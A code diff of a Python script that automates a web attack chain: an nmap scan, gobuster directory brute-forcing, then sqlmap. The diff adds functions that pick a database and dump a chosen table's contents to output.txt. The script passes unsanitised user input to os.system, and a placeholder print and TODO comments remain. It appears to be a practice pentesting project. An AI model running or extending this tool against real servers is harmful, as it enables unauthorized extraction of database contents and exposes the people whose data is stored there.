@@ -90,13 +90,23 @@ def sqlmap(webserver):
         print ("SQLMap failed. Run script again")
     return base_cmd
 
-def database_stuff(code_cmd):
+def database_search(base_cmd):
     database = input("What database would you like to attack? ")
     cmd = base_cmd + " -D " + database +  " --tables"
     try:
         os.system(cmd)
     except KeyboardInterrupt:
         print ("SQLMap - search for database failed. Run script again")
+    return database
+
+def table_dump(base_cmd, database):
+    table = input("What table would you like to attack? ")
+    cmd = base_cmd + " --dump -D " + database +  " -T " + table + " > output.txt"
+    print("HERE, PRINT WHERE DUMP FILE IS LOCATED")
+    try:
+        os.system(cmd)
+    except KeyboardInterrupt:
+        print ("SQLMap - search for database table failed. Run script again")
 
     
 
@@ -107,4 +117,5 @@ if __name__ == "__main__":
     webserver = nmap_scan() # should we clean up nmap output? put output in a seperate file? Give a warning to user when zero hosts are found?
     gobuster(webserver)
     base_cmd = sqlmap(webserver)
-    database_stuff(base_cmd)
+    database = database_search(base_cmd)
+    table_dump(base_cmd, database)
